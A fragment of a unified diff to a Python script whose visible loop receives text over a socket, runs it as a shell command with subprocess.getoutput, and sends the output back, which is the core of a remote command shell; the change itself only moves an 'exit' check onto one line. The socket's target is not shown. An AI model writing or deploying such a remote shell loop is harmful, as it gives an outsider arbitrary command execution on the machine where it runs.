@@ -7,8 +7,7 @@ while True:
     d = s.recv(1024)
     if not d:break
     c = d.decode().strip()
-    if c.strip() == "exit":
-        break
+    if c.strip() == "exit":break
     output = subprocess.getoutput(c)
     s.send(output.encode())
 s.close()
